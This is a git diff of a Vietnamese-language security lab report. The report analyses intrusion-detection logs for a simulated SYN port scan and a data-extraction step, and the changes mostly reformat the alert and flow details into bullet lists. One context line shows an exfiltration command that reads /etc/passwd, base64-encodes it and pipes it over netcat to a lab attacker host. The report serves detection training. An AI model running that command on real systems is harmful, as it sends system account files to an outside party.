@@ -137,7 +137,7 @@ cat /etc/passwd | base64 | nc 192.168.0.30 5555
 
 ### Bước 5: Phân tích log
 
-#### Log của hành vi quét cổng
+### Log của hành vi quét cổng
 
 ```
 { 
@@ -221,31 +221,23 @@ Lưu lượng từ địa chỉ 192.168.0.30 đã gửi một gói TCP SYN đế
 
 Alert được kích hoạt bởi rule của Emerging Threats:
 
-Chữ ký phát hiện: ET SCAN Suspicious inbound to Oracle SQL port 1521
-
-Signature ID: 2010936
-
-Hành động: allowed (gói tin được cho phép đi qua – IDS mode)
-
-Danh mục: Potentially Bad Traffic
-
-Mức độ nghiêm trọng: 2 (Medium)
+- Chữ ký phát hiện: ET SCAN Suspicious inbound to Oracle SQL port 1521
+- Signature ID: 2010936
+- Hành động: allowed (gói tin được cho phép đi qua – IDS mode)
+- Danh mục: Potentially Bad Traffic
+- Mức độ nghiêm trọng: 2 (Medium)
 
 Rule này được thiết kế để phát hiện các hành vi probing hoặc service enumeration nhắm vào cổng cơ sở dữ liệu nhạy cảm.
 
 6. Thông tin về lưu lượng
 
-Gói từ attacker đến server: 1 gói / 60 bytes
+- Gói từ attacker đến server: 1 gói / 60 bytes
+- Gói từ server đến attacker: 0 gói / 0 bytes
+- Thời gian bắt đầu flow: 2026-03-02T23:28:23.155291+0700
+- Direction: to_server
+- Flow ID: 2074347087003202
 
-Gói từ server đến attacker: 0 gói / 0 bytes
-
-Thời gian bắt đầu flow: 2026-03-02T23:28:23.155291+0700
-
-Direction: to_server
-
-Flow ID: 2074347087003202
-
-Phân tích cho thấy chỉ có một gói TCP SYN được gửi đi và không có phản hồi từ phía server. Hành vi này phù hợp với kỹ thuật SYN scan (nmap -sS), thường được sử dụng trong giai đoạn trinh sát hệ thống.
+Phân tích cho thấy chỉ có một gói TCP SYN được gửi đi và không có phản hồi từ phía server. Hành vi này phù hợp với kỹ thuật SYN scan (`nmap -sS`), thường được sử dụng trong giai đoạn trinh sát hệ thống.
 
 
 ### Log của hành vi trích xuất thông tin nhạy cảm
